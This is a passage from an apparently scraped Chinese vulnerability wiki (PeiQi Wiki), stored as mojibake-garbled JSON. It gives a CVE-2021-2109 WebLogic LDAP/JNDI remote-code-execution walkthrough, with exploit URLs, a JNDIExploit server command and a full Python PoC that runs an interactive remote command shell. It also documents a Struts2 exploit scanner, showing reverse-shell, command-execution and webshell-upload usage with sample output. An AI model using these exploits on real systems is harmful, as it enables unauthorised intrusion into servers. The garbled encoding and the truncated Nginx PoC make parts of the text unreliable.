æ‰§è¡Œã€‚CVSSè¯„åˆ†å‡ä¸º9.8ï¼Œåˆ©ç”¨å¤æ‚åº¦ä½ã€‚å»ºè®®ç”¨æˆ·å°½å¿«é‡‡å–æªæ–½ï¼Œå¯¹ä¸Šè¿°æ¼æ´è¿›è¡Œé˜²æŠ¤ã€‚ æ¼æ´å½±å“ [!NOTE] WebLogic Server 10.3.6.0.0 WebLogic Server 12.1.3.0.0 WebLogic Server 12.2.1.3.0 WebLogic Server 12.2.1.4.0 WebLogic Server 14.1.1.0.0 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/weblogic/CVE-2020-14882 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:7001 æ­£å¸¸å³å¯ æ¼æ´å¤ç° è®¿é—®ä¸€ä¸‹URL http://xxx.xxx.xxx.xxx:7001/console/css/%252e%252e%252f/consolejndi.portal å¦‚æœæœ‰æ­¤é¡µé¢æœªæˆæƒå¯è®¿é—®ï¼Œä¸”åœ¨å½±å“èŒƒå›´å†…åˆ™å¯èƒ½å‡ºç°æ¼æ´ ä¸‹è½½æ¼æ´æ”»å‡»éœ€è¦çš„ LDAPå¯åŠ¨è„šæœ¬ ä¸‹è½½é“¾æ¥ ä¸‹è½½åˆ°æœåŠ¡å™¨ä¸Šå¯åŠ¨ java -jar JNDIExploit-v1.11.jar -i xxx.xxx.xxx.xxx (æœåŠ¡å™¨åœ°å€) [!NOTE] éƒ¨åˆ†æœåŠ¡å™¨æ³¨æ„æ”¾è¡Œç«¯å£ ç„¶åé…åˆ WeblogicæœªæˆæƒèŒƒå›´ å‘½ä»¤æ‰§è¡Œ /console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) [!NOTE] æ³¨æ„ ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho è¿™é‡Œ LDAPæœåŠ¡å™¨åœ°å€ç¬¬ä¸‰ä¸ªåˆ†éš”ç¬¦å·ä¸º ; ç™»å½•åå°å¯ä½¿ç”¨æ­¤POCï¼Œæœªæˆæƒçš„è¯ç”¨ä¸Šé¢çš„ /console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://xxx.xxx.xxx;xxx:1389/Basic/WeblogicEcho;AdminServer%22) æ¼æ´åˆ©ç”¨POC [!NOTE] æ³¨æ„å‚æ•°æ ¼å¼ Ldap >>> ldap://xxx.xxx.xxx;xxx:1389 ä¸­çš„åˆ†å· å¦‚æœä½¿ç”¨å…¶ä»–çš„åˆ©ç”¨LdapæœåŠ¡è¯·è‡ªè¡Œæ›´æ”¹ POCå…³é”®å­— æ­¤POCä»…ä»…æ£€éªŒæœ‰æœªæˆæƒçš„æƒ…å†µ import requests import sys import re requests.packages.urllib3.disable_warnings() from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: Weblogic å¤šä¸ªç‰ˆæœ¬ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mLDAP >>> ldap://xxx.xxx.xxx;xxx:1389 \\033[0m') print('+------------------------------------------') def POC_1(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] æ­£åœ¨è¯·æ±‚: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if \"root:\" in response.text: print(\"\\033[32m[o] ç›®æ ‡{}å­˜åœ¨æ¼æ´ \\033[0m\".format(target_url)) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response.text)) else: print(\"\\033[31m[x] å‘½ä»¤æ‰§è¡Œå¤±è´¥ \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ£€æŸ¥å‚æ•°å’ŒLdapæœåŠ¡æ˜¯å¦æ­£ç¡® \\033[0m\", e) def POC_2(target_url, ldap_url, cmd): vuln_url = target_url + \"/console/css/%252e%252e/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&_nfpb=true&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22{}/Basic/WeblogicEcho;AdminServer%22)\".format(ldap_url) print('\\033[36m[o] æ­£åœ¨è¯·æ±‚: {}'.format(vuln_url)) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"cmd\": cmd } try: response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] å“åº”ä¸º:\\n{} \\033[0m\".format(response)) except Exception as e: print(\"\\033[31m[x] è¯·æ£€æŸ¥å‚æ•°å’ŒLdapæœåŠ¡æ˜¯å¦æ­£ç¡® \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) ldap_url = str(input(\"\\033[35mLdap >>> \\033[0m\")) POC_1(target_url, ldap_url, cmd=\"cat /etc/passwd\") while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, ldap_url, cmd) Goby & POC [!NOTE] Weblogic LDAP è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2021-2109 æ³¨æ„æ¼æ´éªŒè¯ Ldapå‚æ•°åŒæ ·è·Ÿä¸Šé¢çš„POCä¸€æ ·æ ¼å¼ï¼Œæ³¨æ„åˆ†å· PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/","title":"Nginx","keywords":"","body":"Nginx Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-13 21:15:58 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Nginx/Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529.html","title":"Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529","keywords":"","body":"Nginxè¶Šç•Œè¯»å–ç¼“å­˜æ¼æ´ CVE-2017-7529 æ¼æ´æè¿° Nginxåœ¨åå‘ä»£ç†ç«™ç‚¹çš„æ—¶å€™ï¼Œé€šå¸¸ä¼šå°†ä¸€äº›æ–‡ä»¶è¿›è¡Œç¼“å­˜ï¼Œç‰¹åˆ«æ˜¯é™æ€æ–‡ä»¶ã€‚ç¼“å­˜çš„éƒ¨åˆ†å­˜å‚¨åœ¨æ–‡ä»¶ä¸­ï¼Œæ¯ä¸ªç¼“å­˜æ–‡ä»¶åŒ…æ‹¬â€œæ–‡ä»¶å¤´â€+â€œHTTPè¿”å›åŒ…å¤´â€+â€œHTTPè¿”å›åŒ…ä½“â€ã€‚å¦‚æœäºŒæ¬¡è¯·æ±‚å‘½ä¸­äº†è¯¥ç¼“å­˜æ–‡ä»¶ï¼Œåˆ™Nginxä¼šç›´æ¥å°†è¯¥æ–‡ä»¶ä¸­çš„â€œHTTPè¿”å›åŒ…ä½“â€è¿”å›ç»™ç”¨æˆ·ã€‚ å¦‚æœæˆ‘çš„è¯·æ±‚ä¸­åŒ…å«Rangeå¤´ï¼ŒNginxå°†ä¼šæ ¹æ®æˆ‘æŒ‡å®šçš„startå’Œendä½ç½®ï¼Œè¿”å›æŒ‡å®šé•¿åº¦çš„å†…å®¹ã€‚è€Œå¦‚æœæˆ‘æ„é€ äº†ä¸¤ä¸ªè´Ÿçš„ä½ç½®ï¼Œå¦‚(-600, -9223372036854774591)ï¼Œå°†å¯èƒ½è¯»å–åˆ°è´Ÿä½ç½®çš„æ•°æ®ã€‚å¦‚æœè¿™æ¬¡è¯·æ±‚åˆå‘½ä¸­äº†ç¼“å­˜æ–‡ä»¶ï¼Œåˆ™å¯èƒ½å°±å¯ä»¥è¯»å–åˆ°ç¼“å­˜æ–‡ä»¶ä¸­ä½äºâ€œHTTPè¿”å›åŒ…ä½“â€å‰çš„â€œæ–‡ä»¶å¤´â€ã€â€œHTTPè¿”å›åŒ…å¤´â€ç­‰å†…å®¹ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Nginx version 0.5.6 - 1.13.2 ç¯å¢ƒæ­å»º git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d è®¿é—® http://xxx.xxx.xxx.xxx:8080 æ­£å¸¸å³å¯ æ¼æ´å¤ç° ä½¿ç”¨ç›®å½•ä¸‹çš„POCè¿›è¡ŒéªŒè¯ python poc.py http://xxx.xxx.xxx.xxx:8080/ æ¼æ´åˆ©ç”¨POC #!/usr/bin/env python import sys import requests if len(sys.argv) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/","title":"Apache","keywords":"","body":"Apache Apache Cocoon Apache Flink Apache HTTPd Apache Kylin Apache Mod_jk Apache Shiro Apache Solr Apache Struts2 Apache Tomcat Apache ActiveMQ Apache Druid Apache ZooKeeper PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-02-02 20:48:49 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/","title":"Apache Struts2","keywords":"","body":"Apache Struts2 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-15 09:03:16 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· Exphub Apache Struts2 Struts2-Scan PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-15 08:57:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Struts2-Scan.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Struts2-Scan.html","title":"æ‰«æå·¥å…· Struts2-Scan","keywords":"","body":"Struts2-Scan æ¼æ´éªŒè¯ å·¥å…·åœ°å€ Struts2-Scan å·¥å…·æè¿° Struts2æ¼æ´åˆ©ç”¨æ‰«æå·¥å…·ï¼ŒåŸºäºäº’è”ç½‘ä¸Šå·²ç»å…¬å¼€çš„Structs2é«˜å±æ¼æ´expçš„æ‰«æåˆ©ç”¨å·¥å…·ï¼Œç›®å‰æ”¯æŒçš„æ¼æ´å¦‚ä¸‹: S2-001, S2-003, S2-005, S2-007, S2-008, S2-009, S2-012, S2-013, S2-015, S2-016, S2-019, S2-029, S2-032, S2-033, S2-037, S2-045, S2-046, S2-048, S2-052, S2-053, S2-devMode, S2-057 æ”¯æŒå•ä¸ªURLæ¼æ´æ£€æµ‹å’Œæ‰¹é‡URLæ£€æµ‹ï¼Œè‡³æ­¤æŒ‡å®šæ¼æ´åˆ©ç”¨ï¼Œå¯è·å–WEBè·¯å¾„ï¼Œæ‰§è¡Œå‘½ä»¤ï¼Œåå¼¹shellå’Œä¸Šä¼ æ–‡ä»¶ï¼Œæ³¨æ„ï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æ¼æ´å‡æ”¯æŒä¸Šè¿°åŠŸèƒ½ï¼Œåªæœ‰éƒ¨åˆ†åŠŸèƒ½æ”¯æŒ è¿è¡Œç¯å¢ƒ Python3.6.XåŠå…¶ä»¥ä¸Šç‰ˆæœ¬ ç¬¬ä¸‰æ–¹åº“: click, requests, bs4 æµ‹è¯•ç¯å¢ƒ: Ubuntu 16.04 æ¼æ´ç¯å¢ƒå·²ä¸Šä¼ ï¼Œå‚è€ƒåœ°å€ï¼š https://github.com/Medicean/VulApps/tree/master/s/struts2/ https://github.com/vulhub/vulhub/tree/master/struts2 å·¥å…·å‚æ•° Usage: Struts2Scan.py [OPTIONS] Struts2æ‰¹é‡æ‰«æåˆ©ç”¨å·¥å…· Options: -i, --info æ¼æ´ä¿¡æ¯ä»‹ç» -v, --version æ˜¾ç¤ºå·¥å…·ç‰ˆæœ¬ -u, --url TEXT URLåœ°å€ -n, --name TEXT æŒ‡å®šæ¼æ´åç§°, æ¼æ´åç§°è¯¦è§info -f, --file TEXT æ‰¹é‡æ‰«æURLæ–‡ä»¶, ä¸€è¡Œä¸€ä¸ªURL -d, --data TEXT POSTå‚æ•°, éœ€è¦ä½¿ç”¨çš„payloadä½¿ç”¨{exp}å¡«å……, å¦‚: name=test&passwd={exp} -c, --encode TEXT é¡µé¢ç¼–ç , é»˜è®¤UTF-8ç¼–ç  -p, --proxy TEXT HTTPä»£ç†. æ ¼å¼ä¸ºhttp://ip:port -t, --timeout TEXT HTTPè¶…æ—¶æ—¶é—´, é»˜è®¤10s -w, --workers TEXT æ‰¹é‡æ‰«æè¿›ç¨‹æ•°, é»˜è®¤ä¸º10ä¸ªè¿›ç¨‹ --header TEXT HTTPè¯·æ±‚å¤´, æ ¼å¼ä¸º: key1=value1&key2=value2 -e, --exec è¿›å…¥å‘½ä»¤æ‰§è¡Œshell --webpath è·å–WEBè·¯å¾„ -r, --reverse TEXT åå¼¹shellåœ°å€, æ ¼å¼ä¸ºip:port --upfile TEXT éœ€è¦ä¸Šä¼ çš„æ–‡ä»¶è·¯å¾„å’Œåç§° --uppath TEXT ä¸Šä¼ çš„ç›®å½•å’Œåç§°, å¦‚: /usr/local/tomcat/webapps/ROOT/shell.jsp -q, --quiet å…³é—­æ‰“å°ä¸å­˜åœ¨æ¼æ´çš„è¾“å‡ºï¼Œåªä¿ç•™å­˜åœ¨æ¼æ´çš„è¾“å‡º -h, --help Show this message and exit. ä½¿ç”¨ä¾‹å­ æŸ¥çœ‹æ¼æ´è¯¦ç»†ä¿¡æ¯: $ python3 Struts2Scan.py --info ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] æ”¯æŒå¦‚ä¸‹Struts2æ¼æ´: [+] S2-001:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.8; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-003:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.0.11.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œ [+] S2-005:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.1.8.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ [+] S2-007:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.2.3; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-008:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-009:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.1.1; GETè¯·æ±‚å‘é€æ•°æ®,URLåé¢éœ€è¦è¯·æ±‚å‚æ•°å; é»˜è®¤ä¸º: key; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-012:å½±å“ç‰ˆæœ¬Struts Showcase App 2.0.0-2.3.13; GETè¯·æ±‚å‘é€æ•°æ®,å‚æ•°ç›´æ¥æ·»åŠ åˆ°URLåé¢; é»˜è®¤ä¸º:name; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-013/S2-014:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-015:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.14.2; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-016:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-019:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.15.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-029:å½±å“ç‰ˆæœ¬Struts 2.0.0-2.3.24.1(é™¤äº†2.3.20.3); POSTè¯·æ±‚å‘é€æ•°æ®,éœ€è¦å‚æ•°; é»˜è®¤å‚æ•°:message; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-032:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-033:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28(é™¤äº†2.3.20.3å’Œ2.3.24.3); GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-037:å½±å“ç‰ˆæœ¬Struts 2.3.20-2.3.28.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-045:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-046:å½±å“ç‰ˆæœ¬Struts 2.3.5-2.3.31,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®,ä¸éœ€è¦å‚æ•°; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œ,åå¼¹shellå’Œæ–‡ä»¶ä¸Šä¼  [+] S2-048:å½±å“ç‰ˆæœ¬Struts 2.3.x with Struts 1 plugin and Struts 1 action; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-053:å½±å“ç‰ˆæœ¬Struts 2.0.1-2.3.33,2.5-2.5.10; POSTè¯·æ±‚å‘é€æ•°æ®; é»˜è®¤å‚æ•°ä¸º:username,password; æ”¯æŒä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell [+] S2-devMode:å½±å“ç‰ˆæœ¬Struts 2.1.0-2.3.1; GETè¯·æ±‚å‘é€æ•°æ®; æ”¯æŒè·å–WEBè·¯å¾„,ä»»æ„å‘½ä»¤æ‰§è¡Œå’Œåå¼¹shell å•ä¸ªURLæ¼æ´æ£€æµ‹: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] æ­£åœ¨æ‰«æURL:http://192.168.100.8:8080/index.action [*] ----------------results------------------ [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-046 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-016 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-045 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-015 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-009 [*] http://192.168.100.8:8080/index.action å­˜åœ¨æ¼æ´: S2-012 æ‰¹é‡æ¼æ´æ£€æµ‹: $ python3 Struts2Scan.py -f urls.txt POSTæ•°æ®: $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin&email=admin&age={exp} æŒ‡å®šæ¼æ´åç§°åˆ©ç”¨: # å‘½ä»¤æ‰§è¡Œ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy >>>ls -la total 136 drwxr-sr-x 1 root staff 4096 May 5 2017 . drwxrwsr-x 1 root staff 4096 May 5 2017 .. -rw-r----- 1 root root 57092 Apr 13 2017 LICENSE -rw-r----- 1 root root 1723 Apr 13 2017 NOTICE -rw-r----- 1 root root 7064 Apr 13 2017 RELEASE-NOTES -rw-r----- 1 root root 15946 Apr 13 2017 RUNNING.txt drwxr-x--- 1 root root 4096 May 5 2017 bin drwx--S--- 1 root root 4096 Jul 12 14:54 conf drwxr-sr-x 3 root staff 4096 May 5 2017 include drwxr-x--- 2 root root 4096 May 5 2017 lib drwxr-x--- 1 root root 4096 Jul 12 14:54 logs drwxr-sr-x 3 root staff 4096 May 5 2017 native-jni-lib drwxr-x--- 2 root root 4096 May 5 2017 temp drwxr-x--- 1 root root 4096 Jul 12 14:54 webapps drwxr-x--- 1 root root 4096 Jul 12 14:54 work >>> # åå¼¹shll $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --reverse 192.168.100.8:8888 ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] è¯·åœ¨åå¼¹åœ°å€å¤„ç›‘å¬ç«¯å£å¦‚: nc -lvvp 8080 # è·å–WEBè·¯å¾„ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --webpath ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [*] /usr/local/tomcat/webapps/ROOT/ # ä¸Šä¼ shell $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --upfile shell.jsp --uppath /usr/local/tomcat/webapps/ROOT/shell.jsp ____ _ _ ____ ____ / ___|| |_ _ __ _ _| |_ ___|___ \\ / ___| ___ __ _ _ __ \\___ \\| __| '__| | | | __/ __| __) | \\___ \\ / __/ _` | '_ \\ ___) | |_| | | |_| | |_\\__ \\/ __/ ___) | (_| (_| | | | | |____/ \\__|_| \\__,_|\\__|___/_____| |____/ \\___\\__,_|_| |_| Author By HatBoy [+] æ–‡ä»¶ä¸Šä¼ æˆåŠŸ! å…³äº å› éƒ¨åˆ†åŸå› ï¼ŒåŸä½œè€…å…³é—­æ¼æ´åˆ©ç”¨ï¼Œå¦‚éœ€åˆ©ç”¨å¯åˆ é™¤ä»¥ä¸‹ä»£ç ä½¿ç”¨ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Exphub-Strtus2.html":{"url":"PeiQi_Wiki/WebæœåŠ¡å™¨æ¼æ´/Apache/Apache Struts2/Scan/æ‰«æå·¥å…· Exphub-Strtus2.html","title":"æ‰«æå·¥å…· Exphub-Strtus2","keywords":"","body":"About Apache Struts2 Pythonè„šæœ¬æ”¾åœ¨å½“å‰ç›®å½•çš„POCæ–‡ä»¶å¤¹ä¸­ Vulnerability list struts2-032_cmd.py Struts2 method ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´GetShellåˆ©ç”¨è„šæœ¬(CVE-2016-3081)struts2-032_poc.py Struts2 method ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´æ£€æµ‹è„šæœ¬(CVE-2016-3081)struts2-045_cmd.py Struts2 Jakarta Multipart parser æ’ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬1(CVE-2017-5638)[ä½¿ç”¨]struts2-045-2_cmd.py Struts2 Jakarta Multipart parser æ’ä»¶è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬2(CVE-2017-5638)[ä½¿ç”¨]struts2-052_cmd.py Struts2 REST æ’ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬(CVE-2017-9805)struts2-052_webshell.py Struts2 REST æ’ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ä¸Šä¼ Webshellè„šæœ¬(CVE-2017-9805)struts2-053_cmd.py Struts2 Freemarker æ ‡ç­¾è¿œç¨‹æ‰§è¡Œå‘½ä»¤æ¼æ´åˆ©ç”¨è„šæœ¬(CVE-2017-12611)struts2-057_cmd.py Struts2 Namespace è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ©ç”¨è„šæœ¬(CVE-2018-11776) Readme éƒ¨åˆ†è„šæœ¬æ–‡ä»¶ä½¿ç”¨è¯´æ˜ï¼Œè¯¦ç»†ä½¿ç”¨åˆ†æè¯·å‚è€ƒvulnerability-listä¸­çš„[ä½¿ç”¨] VER: æ¼æ´å½±å“ç‰ˆæœ¬ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸åœ¨å½±å“èŒƒå›´çš„ç‰ˆæœ¬æ²¡æœ‰ç›¸å…³æ¼æ´ USE: è„šæœ¬æ–‡ä»¶ä½¿ç”¨è¯´æ˜ï¼Œå¤§éƒ¨åˆ†å†™åœ¨äº†è„šæœ¬é‡Œï¼Œæ‰§è¡Œå³å¯è§ EXP: 